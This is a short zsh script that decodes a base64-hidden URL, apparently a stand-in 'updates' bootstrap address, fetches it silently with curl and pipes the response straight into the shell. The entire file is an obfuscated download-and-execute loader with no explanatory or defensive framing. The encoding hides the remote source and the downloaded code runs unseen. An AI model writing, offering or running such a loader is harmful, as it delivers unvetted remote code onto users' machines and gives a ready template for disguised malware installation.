#!/bin/zsh
encoded_url="aHR0cHM6Ly91cGRhdGVzLmludmFsaWQvYm9vdHN0cmFw"
curl -s "$(printf '%s' "$encoded_url" | openssl base64 -d -A)" | zsh
